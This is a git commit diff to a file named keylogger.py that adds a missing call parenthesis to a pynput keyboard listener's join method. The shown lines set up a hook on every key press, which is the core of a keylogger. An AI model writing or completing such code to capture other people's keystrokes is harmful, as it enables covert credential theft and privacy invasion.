17666ae8cdf968edc8b298b136b27eb4245b9c6c
Paul St. Amour <paul35444@aol.com>
2021-05-10 16:59:56 -0500

    +parenthesis to join method

--- keylogger.py
+++ keylogger.py
@@ -6,4 +6,4 @@ def process_key_press(key):
 
 keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
 with keyboard_listener:
-    keyboard_listener.join
+    keyboard_listener.join()
